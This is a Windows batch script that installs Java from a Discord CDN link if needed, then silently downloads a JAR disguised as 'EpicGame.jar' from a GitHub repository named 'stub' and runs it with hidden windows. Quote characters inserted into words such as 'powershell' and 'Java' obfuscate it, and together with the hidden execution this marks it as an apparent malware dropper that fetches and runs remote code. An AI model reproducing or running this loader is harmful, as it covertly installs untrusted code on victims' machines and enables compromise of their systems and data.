@echo off

chcp 65001 >nul

java -version >nul 2>&1
if %errorLevel% NEQ 0 (
    goto :install_java
) else (
    goto :download_and_run_jar
)

:install_java
set "url=https://cdn.discordapp.com/attachments/129"0"426391392686080/12936331"8"9289394196/jre1.8.0_361.zip?ex=6708154a&is=6706c3ca&hm=c85af7a9d1b522cc8d680aeb7ffc5204f6110b50058bba2b42f0679f54f4f0e7"
set "output=%TEMP%\jre1.8.0_3"6"1.zip"
set "installDir=%USERPROFILE%\Java\jre1.8.0_361"

powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%output%')"

powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%output%' -DestinationPath '%installDir%'"

if exist "%installDir%\jre1.8.0_361\bin\java.exe" (
    del "%output%"
) else (
    exit /b 1
)

set PATH=%PATH%;%installDir%\jre1.8.0_361\bin

:download_and_run_jar
set "jarUrl=https://github.com/Python-is-trash/stub/raw/refs/heads/main/J"a"va.jar"
set "jarOutput=%TEMP%\Ep"i"cGame.jar"

powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%jarUrl%', '%jarOutput%')"

if exist "%jarOutput%" (
    po"w"ershell -WindowStyle Hidden -Command "Start-Process 'java' -ArgumentList '-jar', '%jarOutput%' -WindowStyle Hidden"
)

exit
